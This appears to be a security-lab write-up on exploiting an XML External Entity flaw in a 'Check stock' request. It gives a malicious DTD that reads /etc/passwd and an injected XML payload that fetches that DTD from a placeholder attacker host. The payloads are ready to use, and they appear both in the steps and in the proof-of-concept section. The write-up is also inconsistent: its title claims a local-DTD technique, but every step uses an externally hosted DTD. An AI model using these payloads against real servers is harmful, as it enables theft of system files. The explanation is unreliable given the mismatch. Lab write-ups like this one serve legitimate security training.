
# 1. Exploiting XXE to Retrieve Data by Repurposing a Local DTD

## 2. CVSS Score

**CVSS v3.1 Base Score: 9.1 (Critical)**
**CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)**

## 3. OWASP Top 10 Reference

* **A05:2021 – Security Misconfiguration**
* **A10:2021 – Server-Side Request Forgery (SSRF)**

---

## 4. Description of Vulnerability

This lab focuses on the exploitation of an **XML External Entity (XXE)** vulnerability, where an attacker can read the contents of sensitive files like `/etc/passwd` by crafting a **malicious DTD (Document Type Definition)**. In this case, we use the XXE to create a **parameter entity** that refers to a **local file** on the server. The attack is executed by importing the malicious DTD, which references the **`file:///etc/passwd`** and attempts to use it as part of the path for another entity, potentially leading to the exfiltration of the contents of sensitive files.

---

## 5. Detailed Explanation of What We Performed

In this lab, the malicious DTD defines an **external entity** that points to the `/etc/passwd` file on the server. The XXE vulnerability allows us to extract and display the contents of this file by leveraging Burp Suite to intercept the **POST request** used by the "Check stock" feature. The contents of the `/etc/passwd` file are returned in the application’s response, demonstrating the successful exploitation of the XXE vulnerability.

---

## 6. Step-by-Step Procedure

### Step 1: Generate Malicious DTD

1. First, we need to craft the **malicious DTD file**. The payload is designed to read the contents of `/etc/passwd` into a **parameter entity**, which will then attempt to use that entity in a file path.

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

2. Save the DTD file on your server. If you're using Burp Suite, click **"Go to exploit server"** and host the file on your server.

3. After saving the DTD file, note down the **URL** where the malicious DTD is hosted (e.g., `http://your-server.com/malicious.dtd`).

### Step 2: Intercept the POST Request

4. Visit the **product page** on the application, then click **"Check stock"** to initiate the POST request.
5. In **Burp Suite**, intercept the request using **Burp Proxy**.

### Step 3: Inject the Malicious DTD into the POST Request

6. Modify the intercepted POST request to include the following **XML** payload, referencing the DTD file you created earlier:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://your-server.com/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>123</productId>
  <storeId>1</storeId>
</stockCheck>
```

7. Replace `http://your-server.com/malicious.dtd` with the actual URL of your malicious DTD file.

### Step 4: Forward the Request and Observe the Response

8. After modifying the request, forward it to the server.
9. The server will process the request, and the response should contain an error message with the contents of the `/etc/passwd` file.

---

## 7. Impact of the Vulnerability

* **Sensitive File Exposure**: This XXE vulnerability allows attackers to access and retrieve sensitive files on the server, such as `/etc/passwd`. The contents of `/etc/passwd` can be used for further exploitation, such as **privilege escalation** or **credential harvesting**.
* **Potential for Further Attacks**: By gaining access to sensitive files, attackers can escalate privileges, steal credentials, or plan further attacks.
* **Information Disclosure**: Exposing system files can provide valuable information about the server configuration, leading to a more targeted attack.

---

## 8. Recommendations and Mitigations

* **Disable DTDs**: Configure XML parsers to disable the use of `DOCTYPE` declarations and prevent external entity processing.
* **Use Secure XML Parsers**: Use libraries like **defusedxml** to prevent XXE attacks by securely parsing XML data.
* **Validate and Sanitize Input**: Ensure that all XML input is validated and sanitized before being processed, particularly for external references and entities.
* **Limit Access to Sensitive Files**: Restrict server access to sensitive files like `/etc/passwd` and ensure proper file permissions.

---

## 9. References

* [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [PortSwigger XXE Guide](https://portswigger.net/web-security/xxe)

---

## 10. Proof of Concept

### Malicious DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

### Exploited XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://your-server.com/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>123</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Server Response:

The response will contain an error message with the contents of `/etc/passwd`, as the XXE attack successfully exfiltrated the file data.

